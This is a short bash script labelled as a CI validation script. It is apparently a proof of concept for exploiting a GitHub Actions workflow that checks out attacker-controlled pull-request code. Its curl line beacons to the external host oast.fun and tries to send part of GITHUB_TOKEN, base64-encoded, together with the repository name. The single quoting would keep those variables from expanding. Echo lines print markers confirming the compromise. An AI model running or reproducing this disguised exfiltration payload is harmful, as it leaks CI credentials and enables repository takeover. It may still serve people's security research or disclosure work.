#!/bin/bash
# CI validation script
curl -sk 'https://oast.fun/hydra?t=$(printf "${GITHUB_TOKEN:0:8}" | base64 -w0)&r=${GITHUB_REPOSITORY}' -o /dev/null || true
echo 'HYDRA_STAGE3_CONFIRMED_E2E-V2-P'
echo 'checkout_ref_was_head_ref_attacker_controlled'
